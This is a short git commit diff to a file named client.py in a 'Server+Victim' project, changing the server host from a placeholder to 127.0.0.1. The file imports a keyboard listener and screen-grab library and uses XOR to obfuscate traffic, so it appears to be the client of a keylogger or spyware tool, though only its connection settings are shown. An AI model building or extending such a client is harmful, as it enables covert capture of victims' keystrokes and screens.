604552cef267f7b629dd4b5001579f194327bf7f
meklon101 <mohmd101@gmail.com>
2026-08-05 17:27:51 +0300

    Update server host IP address in client.py

--- Server+Victim/client.py
+++ Server+Victim/client.py
@@ -13,7 +13,7 @@ from pynput.keyboard import Listener
 from PIL import ImageGrab
 
 # --- Connection Settings ---
-SERVER_HOST = "SERVER_IP"  # Replace with your server's IP address
+SERVER_HOST = "127.0.0.1"  # Replace with your server's IP address
 SERVER_PORT = 8080
 # XOR key used for lightweight traffic obfuscation
 KEY = b'simple_xor_key'
